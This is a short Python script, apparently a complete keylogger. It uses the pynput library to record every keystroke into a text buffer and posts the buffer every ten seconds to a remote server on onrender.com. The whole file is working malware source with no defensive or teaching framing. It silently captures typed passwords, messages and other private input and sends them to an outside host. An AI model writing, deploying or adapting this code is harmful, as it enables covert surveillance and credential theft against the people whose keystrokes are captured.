from pynput import keyboard
import requests
import json
import threading

text = "hhhhhh"

ip_address = "https://mini-server-90un.onrender.com/send"
port_number = "10000"
time_interval = 10

def send_post_req():
    try:
        files = {
            "text": (None, text)  
           }            
        r = requests.post(ip_address, files=files)
        timer = threading.Timer(time_interval, send_post_req)
   
        timer.start()
    except:
        print("Couldn't complete request!")


def on_press(key):
    global text


    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")

with keyboard.Listener(
    on_press=on_press) as listener:
    send_post_req()
    listener.join()
